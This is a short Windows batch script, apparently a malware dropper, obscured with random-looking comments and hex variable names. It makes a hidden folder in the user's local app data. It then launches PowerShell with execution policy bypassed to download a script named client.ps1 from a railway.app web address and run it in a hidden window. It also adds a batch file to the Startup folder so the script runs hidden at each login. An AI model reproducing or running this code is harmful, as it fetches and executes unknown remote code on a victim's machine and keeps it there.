@echo off
REM Ver434
setlocal EnableDelayedExpansion
REM Ver152
REM Mod587

REM [f97bc0e13ac9f768697866f630db3165]

set "fa90a380=%LOCALAPPDATA%\d8c30fe2ff"
set "dbd0bc7c=https://web-production-9d7cc.up.railway.app/client.ps1"
set "bac0d0ea=%fa90a380%\397ba2cf77.ps1"

REM Proc929
if not exist "%fa90a380%" mkdir "%fa90a380%"

REM Sys112
powershell -ep bypass -c "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;(New-Object Net.WebClient).DownloadFile('%dbd0bc7c%','%bac0d0ea%');Start-Process powershell -ArgumentList '-w hidden -ep bypass -f \"%bac0d0ea%\"' -WindowStyle Hidden"

REM Core940
set "startup=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
if not exist "%startup%\0b9948.bat" (
    echo @echo off> "%startup%\0b9948.bat"
    echo powershell -w hidden -ep bypass -f "%bac0d0ea%">> "%startup%\0b9948.bat"
)

REM Core408
exit /b 0

REM [7FF5C91C72908E6D76D2DA01]
